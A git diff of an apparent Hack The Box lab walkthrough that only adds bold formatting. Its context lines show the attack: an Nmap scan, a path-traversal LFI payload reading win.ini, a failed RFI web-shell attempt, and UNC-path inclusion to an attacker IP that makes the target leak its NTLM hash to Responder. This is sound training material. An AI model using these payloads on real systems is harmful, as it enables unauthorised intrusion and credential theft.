@@ -23,7 +23,7 @@ This revealed two open ports:
 - Port 80/tcp – `HTTP`
 - Port 5985/tcp – `WSMan (Windows Remote Management)`
 
-Next, I ran a more detailed service and version detection scan on these ports using the default Nmap scripts.
+Next, I ran a more detailed service and version detection scan on these ports using the default **Nmap** scripts.
 
 ```
 sudo nmap -sS -sC -sV -p 80,5985 -T5 10.129.197.98
@@ -47,11 +47,11 @@ The web server is running `Apache 2.4.52` on a Windows platform, along with `PHP
 |_http-server-header: Microsoft-HTTPAPI/2.0
 ```
 
-This port is associated with `Windows Remote Management (WinRM)` and confirms that the target is running `Microsoft HTTPAPI 2.0`, further verifying the Windows environment.
+This port is associated with `Windows Remote Management (WinRM)` and confirms that the target is running `Microsoft HTTPAPI 2.0`, further verifying the **Windows** environment.
 
 ### Web Technologies
 
-To enumerate the technologies used by the web server, I utilized `Wappalyzer`, which confirmed the same information gathered with Nmap. This reinforced the initial findings and helped validate the target’s technology stack.
+To enumerate the technologies used by the web server, I utilized **Wappalyzer**, which confirmed the same information gathered with **Nmap**. This reinforced the initial findings and helped validate the target’s technology stack.
 
 ![Web Technologies](images/web-technologies.png)
 
@@ -67,7 +67,7 @@ Inspecting the URL when changing the language revealed the following pattern:
 http://unika.htb/index.php?page=german.html
 ```
 
-This indicated that the page content was likely being dynamically included based on the `page` parameter — a potential sign of **Local File Inclusion (LFI)**. To test for LFI, I modified the `page` parameter to attempt accessing a local system file.
+This indicated that the page content was likely being dynamically included based on the `page` parameter — a potential sign of **Local File Inclusion (LFI)**. To test for **LFI**, I modified the `page` parameter to attempt accessing a local system file.
 
 ```
 http://unika.htb/index.php?page=../../../../../../../windows/win.ini
@@ -75,17 +75,17 @@ http://unika.htb/index.php?page=../../../../../../../windows/win.ini
 
 ![LFI Success.png](images/lfi-success.png)
 
-The file was successfully included and displayed in the browser, confirming the presence of an LFI vulnerability. At this point, I knew that the server was vulnerable to arbitrary file inclusion, and I began exploring ways to leverage this vulnerability to move further into the system.
+The file was successfully included and displayed in the browser, confirming the presence of an **LFI** vulnerability. At this point, I knew that the server was vulnerable to arbitrary file inclusion, and I began exploring ways to leverage this vulnerability to move further into the system.
 
 ## Deeper Investigation and NTLM Hash Capture via SMB
 
-After confirming the LFI vulnerability, I initially tried to escalate it to a **Remote File Inclusion (RFI)** attack by hosting a malicious web shell via a Python HTTP server, hoping to include it remotely through the vulnerable `page` parameter. Unfortunately, this approach did not work, as the server was not configured to allow RFI.
+After confirming the LFI vulnerability, I initially tried to escalate it to a **Remote File Inclusion (RFI)** attack by hosting a malicious web shell via a Python HTTP server, hoping to include it remotely through the vulnerable `page` parameter. Unfortunately, this approach did not work, as the server was not configured to allow **RFI**.
 
-While digging deeper, I discovered an important detail about how PHP’s `include()` function behaves on Windows systems when given a UNC path (a network share path like `\\10.10.14.249\fakeshare`). When PHP on a Windows system attempts to include a remote file via a UNC path (e.g., `\\10.10.14.249\fakeshare`), the server tries to authenticate to that remote **SMB** share using **NTLM** authentication.
+While digging deeper, I discovered an important detail about how PHP’s `include()` function behaves on Windows systems when given a **UNC path** (a network share path like `\\10.10.14.249\fakeshare`). When PHP on a Windows system attempts to include a remote file via a UNC path (e.g., `\\10.10.14.249\fakeshare`), the server tries to authenticate to that remote **SMB** share using **NTLM** authentication.
 
-This behavior can be abused to capture authentication hashes by setting up a malicious SMB server on the attacker’s machine. The target server will automatically send its credentials when attempting to access the share, allowing an attacker to capture NTLM hashes.
+This behavior can be abused to capture authentication hashes by setting up a malicious **SMB** server on the attacker’s machine. The target server will automatically send its credentials when attempting to access the share, allowing an attacker to capture NTLM hashes.
 
-To exploit this, I launched **Responder** on my machine to listen and capture NTLM hashes over SMB.
+To exploit this, I launched **Responder** on my machine to listen and capture **NTLM** hashes over **SMB**.
 
 ```
 sudo responder -I tun0 -d -w
